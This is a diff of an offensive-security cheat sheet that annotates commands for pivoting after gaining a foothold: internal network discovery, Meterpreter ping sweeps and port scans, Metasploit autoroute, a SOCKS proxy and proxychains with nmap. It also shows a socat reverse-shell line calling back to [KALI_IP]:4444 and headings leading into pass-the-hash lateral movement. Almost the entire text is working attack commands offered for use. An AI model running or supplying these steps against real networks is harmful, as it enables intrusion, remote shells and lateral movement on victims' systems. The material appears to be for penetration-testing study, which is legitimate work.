@@ -10,49 +10,56 @@ Foothold → Discover Internal Network → Set Up Tunnel/Route → Scan Internal
 
 ```bash
 # Linux foothold
-ip a
-ip route
-cat /etc/hosts
-cat /etc/networks
-arp -a
-netstat -tulnp
-ss -tulnp
+ip a                                         # List all interfaces and internal IP addresses
+ip route                                     # View routing table to find hidden subnets
+cat /etc/hosts                               # Check for hardcoded internal IP/Hostname mappings
+cat /etc/networks                            # View defined network names/addresses
+arp -a                                       # View ARP cache (Neighbor discovery without scanning)
+netstat -tulnp                               # List listening TCP/UDP ports with PIDs (Legacy)
+ss -tulnp                                    # List listening ports with PIDs (Modern/Faster)
+# Fast Multi-threaded Ping Sweep of a /24 subnet:
 for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i & done | grep "64 bytes"
 
 # Windows foothold (cmd/meterpreter shell)
-ipconfig /all
-route print
-arp -a
-netstat -ano
-net view
+ipconfig /all                                # Full IP config, DNS servers, and DHCP info
+route print                                  # View IPv4/IPv6 routing table for gateways
+arp -a                                       # Check ARP table for recently contacted hosts
+netstat -ano                                 # List all connections and listening ports with PIDs
+net view                                     # List computers/shares in the current Domain/Workgroup
 ```
 
 ### Meterpreter Network Discovery
 
 ```bash
 # Inside meterpreter session
-ipconfig
-arp
-route
+ipconfig                                     # View interfaces, IPs, and Subnet Masks
+arp                                          # View the ARP cache (Neighbor discovery)
+route                                        # View the victim's routing table
+
+# Multi-OS Ping Sweep (Finds live hosts in a subnet)
 run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/24
+
+# Windows ARP Scanner (Finds live hosts without ICMP/Ping)
 run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24
+
+# TCP Port Scanner (Checks common ports on internal targets)
 run auxiliary/scanner/portscan/tcp RHOSTS=10.10.10.0/24 PORTS=22,80,445,3389,8080
 ```
 
 ---
-
+# Pivoting :
 ## 2️⃣ METASPLOIT ROUTING + SOCKS PROXY — Heavy Hitter ⭐⭐⭐
 
 ### autoroute — Heavy Hitter ⭐⭐⭐
 
 ```bash
 # Method 1 — From meterpreter session
-run autoroute -s 10.10.10.0/24          # add route through session
-run autoroute -p                         # print current routes
-run autoroute -d -s 10.10.10.0/24       # delete route
+run autoroute -s 10.10.10.0/24          # Add route through current session
+run autoroute -p                        # Print/Verify current routes
+run autoroute -d -s 10.10.10.0/24       # Delete a specific route
 
 # Method 2 — From msfconsole background
-background
+background                              # Exit meterpreter to main console
 use post/multi/manage/autoroute
 set SESSION [SESSION_ID]
 set SUBNET 10.10.10.0
@@ -60,9 +67,9 @@ set NETMASK 255.255.255.0
 run
 
 # Method 3 — route command in msfconsole
-route add 10.10.10.0/24 [SESSION_ID]
-route print
-route flush
+route add 10.10.10.0/24 [SESSION_ID]    # Manually link subnet to session
+route print                             # View all active MSF routes
+route flush                             # Clear all routes (Start over)
 ```
 
 ### SOCKS Proxy (route traffic through session)
@@ -70,21 +77,24 @@ route flush
 ```bash
 # After autoroute — add SOCKS proxy
 use auxiliary/server/socks_proxy
-set SRVHOST 127.0.0.1
-set SRVPORT 9050
-set VERSION 5
+set SRVHOST 127.0.0.1                    # Bind to your local Kali loopback
+set SRVPORT 9050                         # Default port for Proxychains
+set VERSION 5                            # SOCKS5 supports UDP and Auth
 run -j                                   # run as background job
 
 # Verify proxy is running
-jobs
-netstat -tulnp | grep 9050
+jobs                                     # Check Metasploit background jobs
+netstat -tulnp | grep 9050               # Confirm port 9050 is OPEN on Kali
 ```
 
 ### proxychains — Use with SOCKS (On Kali)
 
 ```bash
-# /etc/proxychains4.conf (or proxychains.conf):
-# socks5 127.0.0.1 9050
+# View active config (ignoring comments)
+cat /etc/proxychains4.conf | grep -v "^#"
+
+# Quick add if missing (ensure no duplicates)
+echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
 
 # Use proxychains to reach internal hosts
 proxychains nmap -sT -Pn -p 22,80,445,3389 10.10.10.[TARGET]
@@ -284,7 +294,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[KALI_IP]:4444
 ```
 
 ---
-
+# Lateral Movement :
 ## 6️⃣ PASS-THE-HASH (PTH) ⭐⭐
 
 ### Capture Hash First
